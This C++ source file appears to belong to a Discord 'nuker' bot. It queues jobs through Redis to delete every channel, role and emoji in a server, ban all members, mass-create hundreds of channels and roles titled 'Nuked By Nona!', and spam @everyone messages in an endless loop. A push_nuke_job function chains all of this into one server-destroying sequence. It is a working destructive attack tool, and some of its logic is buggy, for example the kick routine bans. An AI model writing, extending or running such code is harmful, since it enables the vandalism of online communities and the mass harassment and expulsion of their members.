// Standard library imports.

#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <filesystem>
#include <mutex>

// External module imports.

#include <nlohmann/json.hpp>
#include <sw/redis++/redis++.h>
#include <dpp/dpp.h>

// Custom module imports.

#include "../cogs/channels/c_create.h"
#include "../cogs/channels/c_delete.h"
#include "../cogs/emojis/e_create.h"
#include "../cogs/emojis/e_delete.h"
#include "../cogs/members/m_ban.h"
#include "../cogs/members/m_kick.h"
#include "../cogs/roles/r_create.h"
#include "../cogs/roles/r_delete.h"

#include "../misc/time.h"
#include "../misc/colours.h"
#include "../redis/precaching.h"

using json = nlohmann::json;

std::mutex deleted_channel_mutex;
std::mutex deleted_emoji_mutex;
std::mutex banned_member_mutex;
std::mutex kicked_member_mutex;
std::mutex deleted_role_mutex;

// Initialise the JSON object.

const json &get_config() {

    /*
    Static makes this only be loaded once.
    */

    static json config = [] {

        // Load variables.json

        std::ifstream unloaded_variables("config/variables.json");
        if (!unloaded_variables) {
            std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "Unable to open variables.json." << std::endl;
            return json{};
        }

        json variables;
        unloaded_variables >> variables;

        // Fetch channel names.

        if (!variables.contains("channel_names") || !variables["channel_names"].is_array()) {
            std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "channel_names is malformed." << std::endl;
            variables["channel_names"] = {"New Channel"};    
        }
        if (!variables.contains("spam_messages") || !variables["spam_messages"].is_array()) {
            std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "spam_messages is malformed." << std::endl;
            variables["spam_messages"] = {"@everyone"};
        }
        if (!variables.contains("role_names") || !variables["role_names"].is_array()) {
            std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "role_names is malformed." << std::endl;
            variables["role_names"] = {"New Role"};
        }
        if (!variables.contains("emoji_names") || !variables["emoji_names"].is_array()) {
            std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "emoji_names is malformed." << std::endl;
            variables["emoji_names"] = {"New Emoji"};            
        }
        if (!variables.contains("channel_topics") || !variables["channel_topics"].is_array()) {
            std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "channel_topics is malformed." << std::endl;
            variables["channel_topics"] = {"**Nuked By Nona!**"};            
        }

        return variables;

    }();

    return config;

}

// Load all variables.

std::string return_random_channel_name() {

    /*
    Return a random channel name from the variables.json file.
    */

    const auto &channels = get_config()["channel_names"];

    if (!channels.is_array() || channels.empty()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "There are no valid channel names." << std::endl;
        return "New Channel";
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0 , channels.size() - 1);

    const auto &chosen = channels[dist(gen)];
    if (!chosen.is_string()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "The channel name is not a string." << std::endl;
        return "New Channel";
    }

    return chosen.get<std::string>();
}

dpp::snowflake return_random_channel() {

    /*
    Return a random channel from the channels vector.
    */

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0 , channels.size() - 1);
    dpp::snowflake random_channel = channels[dist(gen)];

    return random_channel;

}

std::string return_random_spam_message() {

    /*
    Returns a random string from variables.json to spam.
    */

    const auto &messages = get_config()["spam_messages"];

    if (!messages.is_array() || messages.empty()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "There are no valid spam messages." << std::endl;
        return "@everyone";
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0 , messages.size() - 1);

    const auto &chosen = messages[dist(gen)];
    if (!chosen.is_string()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "The spam message is not a string." << std::endl;
        return "@everyone";
    }
    std::string random_message = messages[dist(gen)];

    return chosen.get<std::string>();

}

std::string return_random_role_name() {

    /*
    Returns a random role name from variables.json.
    */

    const auto &roles = get_config()["role_names"];

    if (!roles.is_array() || roles.empty()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "There are no valid role names." << std::endl;
        return "New Role";
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0 , roles.size() - 1);

    const auto &chosen = roles[dist(gen)];
    if (!chosen.is_string()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "The role name is not a string." << std::endl;
        return "New Role";
    }

    return chosen.get<std::string>();

}

std::string return_random_emoji_file() {

    /*
    Returns a random image from the emojis folder.
    */

    std::vector<std::filesystem::path> files;
    for (auto &image : std::filesystem::directory_iterator("config/emojis")) {
        if (image.is_regular_file()) {
            files.push_back(image.path());
        }
    }

    if (files.empty()) {
        return "";
    }
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0 , files.size() - 1);
    return files[dis(gen)].string();

}

std::string return_random_sticker_file() {

    /*
    Returns a random image from the stickers folder.
    */

    std::vector<std::filesystem::path> files;
    for (auto &image : std::filesystem::directory_iterator("config/stickers")) {
        if (image.is_regular_file()) {
            files.push_back(image.path());
        }
    }

    if (files.empty()) {
        return "";
    }
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0 , files.size() - 1);
    return files[dis(gen)].string();

}

std::string return_random_emoji_name() {

    /*
    Return a random emoji name from the variables.json file.
    */

    const auto &emojis = get_config()["emoji_names"];

    if (!emojis.is_array() || emojis.empty()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "There are no valid emoji names." << std::endl;
        return "New Emoji";
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0 , emojis.size() - 1);

    const auto &chosen = emojis[dist(gen)];
    if (!chosen.is_string()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "The emoji name is not a string." << std::endl;
        return "New Emoji";
    }

    return chosen.get<std::string>();
}

std::string return_random_sticker_name() {

    /*
    Return a random sticker name from the variables.json file.
    */

    const auto &stickers = get_config()["sticker_names"];

    if (!stickers.is_array() || stickers.empty()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "There are no valid sticker names." << std::endl;
        return "New Sticker";
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0 , stickers.size() - 1);

    const auto &chosen = stickers[dist(gen)];
    if (!chosen.is_string()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "The sticker name is not a string." << std::endl;
        return "New Sticker";
    }

    return chosen.get<std::string>();
}

std::string return_random_channel_topic() {

    /*
    Return a random channel topic from the variables.json file.
    */

    const auto &channel_topics = get_config()["channel_topics"];

    if (!channel_topics.is_array() || channel_topics.empty()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "There are no valid channel topics." << std::endl;
        return "**Nuked By Nona!**";
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0 , channel_topics.size() - 1);

    const auto &chosen = channel_topics[dist(gen)];
    if (!chosen.is_string()) {
        std::cout << MAG << "[ " << get_current_time() << " ] " << RED << "The channel topic is not a string." << std::endl;
        return "**Nuked By Nona!**";
    }

    return chosen.get<std::string>();

}

// Create Channels.

void push_create_channel_job(const dpp::snowflake &guild_id) {

    /*
    Push the createchannel command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    std::string channel_name = return_random_channel_name();
    json job = {
        {"command" , "create_channel"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"channel_name" , channel_name},
            {"channel_topic" , return_random_channel_topic()}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());
}

void push_create_channels_job(const dpp::snowflake &guild_id) {

    /*
    Push the createchannels command to the job queue.
    */

    auto start = std::chrono::high_resolution_clock::now();
    int jobs_pushed = 0;
    int channels_to_create = 500 - channels.size();
    if (channels_to_create < 0) {
        channels_to_create = 0;
    }
    for (int i = 0; i < channels_to_create; ++i) {
        push_create_channel_job(guild_id);
        std::this_thread::sleep_for(std::chrono::milliseconds(15));
        ++jobs_pushed;
    }
    while (created_channels < channels_to_create) {
        continue;
    }
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Created " << jobs_pushed << " channels in " << elapsed.count() << " seconds." << std::endl;

}

// Delete Channels.

void push_delete_channel_job(const dpp::snowflake &guild_id , dpp::snowflake &channel_id) {

    /*
    Push the deletechannel command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "delete_channel"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"channel_id" , std::to_string(channel_id)}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());
}

void push_delete_channels_job(const dpp::snowflake &guild_id) {

    /*
    Push the deletechannels command to the job queue.
    */

    int jobs_pushed = 0;
    int channels_to_delete = channels.size();
    auto start = std::chrono::high_resolution_clock::now();
    for (const dpp::snowflake &channel : channels) {
        dpp::snowflake channel_to_delete_id = channel;
        push_delete_channel_job(guild_id , channel_to_delete_id);
        jobs_pushed++;
        std::this_thread::sleep_for(std::chrono::milliseconds(15));
    }
    while (deleted_channels < channels_to_delete) {
        continue;
    }
    std::lock_guard<std::mutex> lock(deleted_channel_mutex);
    channels.clear();
    channel_names.clear();
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Deleted " << jobs_pushed << " channels in " << elapsed.count() << " seconds." << std::endl;

}

void push_spam_channel_job(const dpp::snowflake &guild_id , dpp::snowflake &channel_id , int spam_count) {

    /*
    Push the spamchannel command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    auto start = std::chrono::high_resolution_clock::now();
    for (int i = 0; i < spam_count; ++i) {
        return_random_spam_message();\
        json job = {
            {"command" , "spam_channel"},
            {"args" , {
                {"guild_id" , std::to_string(guild_id)},
                {"channel_id" , std::to_string(channel_id)},
                {"message" , return_random_spam_message()}
            }}
        };
        auto result = redis.rpush("job_queue" , job.dump());
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Spammed " << spam_count << " channels in " << elapsed.count() << " seconds." << std::endl;

}

void push_spam_channels_job(const dpp::snowflake &guild_id) {

    /*
    Push the spamchannels command to the job queue.
    */

    while (true) {
        dpp::snowflake random_channel = return_random_channel();
        push_spam_channel_job(guild_id , random_channel , 1);
    }

}

void push_ban_member_job(const dpp::snowflake &guild_id , dpp::snowflake &user_id) {
    
    /*
    Push the banmember command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "ban_member"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"user_id" , std::to_string(user_id)}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());

}

void push_ban_members_job(const dpp::snowflake &guild_id) {

    /*
    Push the banmembers command to the job queue.
    */

    int jobs_pushed = 0;
    int members_to_ban = members.size(); 
    if (members_to_ban <= 0) {
        members_to_ban = 0;
    }
    auto start = std::chrono::high_resolution_clock::now();
    for (dpp::snowflake member : members) {
        push_ban_member_job(guild_id , member);
        jobs_pushed++;
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
    std::lock_guard<std::mutex> lock(banned_member_mutex);
    // TO DO: MANAGE PERMISSION ERROR FALSE BANS FOR THE CLEAR LIST.
    //        MAYBE MAKE A WHITE/BLACK LIST. LOOP BANNING WORKS BUT
    //        CAN BE SLOW FOR LARGE SERVERS.
    while (banned_members < members_to_ban) {
        continue;
    }
    members.clear();
    member_names.clear();
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Banned " << jobs_pushed << " members in " << elapsed.count() << " seconds." << std::endl;

}

void push_kick_member_job(const dpp::snowflake &guild_id , dpp::snowflake &user_id) {
    
    /*
    Push the kickmember command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "kick_member"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"user_id" , std::to_string(user_id)}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());

}

void push_kick_members_job(const dpp::snowflake &guild_id) {

    /*
    Push the kickmembers command to the job queue.
    */

    int jobs_pushed = 0;
    int members_to_kick = members.size();
    auto start = std::chrono::high_resolution_clock::now();
    for (dpp::snowflake member : members) {
        push_ban_member_job(guild_id , member);
        jobs_pushed++;
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
    std::lock_guard<std::mutex> lock(kicked_member_mutex);
    // TO DO: MANAGE PERMISSION ERROR FALSE KICKS FOR THE CLEAR LIST.
    //        MAYBE MAKE A WHITE/BLACK LIST. LOOP KICKING WORKS BUT
    //        CAN BE SLOW FOR LARGE SERVERS.
    members.clear();
    member_names.clear();
    while (kicked_members < members_to_kick) {
        continue;
    }
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Kicked " << jobs_pushed << " members in " << elapsed.count() << " seconds." << std::endl;

}

void push_give_permissions_job(const dpp::snowflake &guild_id) {

    /*
    Push the givepermissions command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "give_permissions"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());

}

void push_create_role_job(const dpp::snowflake &guild_id) {
    
    /*
    Push the createrole command to the job queue.
    */

    std::string role_name = return_random_role_name();

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "create_role"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"name" , role_name}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());

}

void push_create_roles_job(const dpp::snowflake &guild_id) {

    /*
    Push the createroles command to the job queue.
    */

    auto start = std::chrono::high_resolution_clock::now();
    int jobs_pushed = 0;
    int roles_to_create = (250 - roles.size());
    if (roles_to_create < 0) {
        roles_to_create = 0;
    }
    for (int i = 0; i < roles_to_create; ++i) {
        push_create_role_job(guild_id);
        std::this_thread::sleep_for(std::chrono::milliseconds(40));
        ++jobs_pushed;
    }
    std::lock_guard<std::mutex> lock(created_role_mutex);
    while (created_roles < roles_to_create) {
        continue;
    }
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Created " << jobs_pushed << " roles in " << elapsed.count() << " seconds." << std::endl;

}

void push_delete_role_job(const dpp::snowflake &guild_id , dpp::snowflake &role_id) {

    /*
    Push the deleterole command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "delete_role"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"role_id" , std::to_string(role_id)}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());
}

void push_delete_roles_job(const dpp::snowflake &guild_id) {

    /*
    Push the deletechannels command to the job queue.
    */

    int jobs_pushed = 0;
    int roles_to_delete = roles.size();
    if (roles_to_delete <= 0) {
        roles_to_delete = 0;
    }
    auto start = std::chrono::high_resolution_clock::now();
    for (const dpp::snowflake &role : roles) {
        dpp::snowflake role_id = role;
        push_delete_role_job(guild_id , role_id);
        jobs_pushed++;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    while (deleted_roles < roles_to_delete) {
        continue;
    }
    std::lock_guard<std::mutex> lock(deleted_role_mutex);
    roles.clear();
    role_names.clear();
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Deleted " << jobs_pushed << " roles in " << elapsed.count() << " seconds." << std::endl;

}

void push_create_emoji_job(const dpp::snowflake &guild_id) {

    /*
    Push the createemoji command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "create_emoji"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"name" , return_random_emoji_name()}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());
}

void push_create_emojis_job(const dpp::snowflake &guild_id) {

    /*
    Push the createemojis command to the job queue.
    */

    auto start = std::chrono::high_resolution_clock::now();
    int jobs_pushed = 0;
    int emojis_to_create = (50 - roles.size());
    if (emojis_to_create < 0) {
        emojis_to_create = 0;
    }
    for (int i = 0; i < emojis_to_create; ++i) {
        push_create_emoji_job(guild_id);
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
        ++jobs_pushed;
    }
    std::lock_guard<std::mutex> lock(created_emoji_mutex);
    while (created_emojis < emojis_to_create) {
        continue;
    }
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Created " << jobs_pushed << " emojis in " << elapsed.count() << " seconds." << std::endl;

}

void push_delete_emoji_job(const dpp::snowflake &guild_id , dpp::snowflake &emoji_id) {

    /*
    Push the deleteemoji command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "delete_emoji"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"emoji_id" , std::to_string(emoji_id)}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());
}

void push_delete_emojis_job(const dpp::snowflake &guild_id) {

    /*
    Push the deleteemojis command to the job queue.
    */

    int jobs_pushed = 0;
    int emojis_to_delete = emojis.size();
    auto start = std::chrono::high_resolution_clock::now();
    for (const dpp::snowflake &emoji : emojis) {
        dpp::snowflake emoji_id = emoji;
        push_delete_emoji_job(guild_id , emoji_id);
        jobs_pushed++;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
    std::lock_guard<std::mutex> lock(deleted_emoji_mutex);
    while (deleted_emojis < emojis_to_delete) {
        continue;
    }
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Deleted " << jobs_pushed << " emojis in " << elapsed.count() << " seconds." << std::endl;

}

void push_create_sticker_job(const dpp::snowflake &guild_id) {

    /*
    Push the createsticker command to the job queue.
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "create_sticker"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)},
            {"name" , return_random_sticker_name()}
        }}
    };
    auto result = redis.rpush("job_queue" , job.dump());
}

void push_create_stickers_job(const dpp::snowflake &guild_id) {

    /*
    Push the createstickers command to the job queue.
    */

    auto start = std::chrono::high_resolution_clock::now();
    int jobs_pushed = 0;
    int stickers_to_create = (5 - stickers.size());
    for (int i = 0; i < stickers_to_create; ++i) {
        push_create_sticker_job(guild_id);
        std::this_thread::sleep_for(std::chrono::milliseconds(7));
        ++jobs_pushed;
    }
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Created " << jobs_pushed << " stickers in " << elapsed.count() << " seconds." << std::endl;

}

void push_change_icon_job(const dpp::snowflake &guild_id) {

    /*
    Push the changeicon job to the job queue. 
    */

    sw::redis::Redis redis("tcp://127.0.0.1:6379");
    json job = {
        {"command" , "change_icon"},
        {"args" , {
            {"guild_id" , std::to_string(guild_id)}
        }}
    };
    
    auto results = redis.rpush("job_queue" , job.dump());

}

void push_nuke_job(const dpp::snowflake &guild_id) {

    /*
    Nuke the entire server.
    */

    auto start = std::chrono::high_resolution_clock::now();
    push_give_permissions_job(guild_id);
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
    push_delete_channels_job(guild_id);
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
    push_delete_emojis_job(guild_id);
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
    push_delete_roles_job(guild_id);
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
    push_ban_members_job(guild_id);
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
    push_create_channels_job(guild_id);
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
    push_create_emojis_job(guild_id);
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
    push_create_roles_job(guild_id);
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
    push_spam_channels_job(guild_id);
    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end - start;
    std::cout << MAG << "[ " << get_current_time() << " ] " << GRN << "Nuked the server " << guild_name << " in " << elapsed.count() << " seconds." << std::endl;

}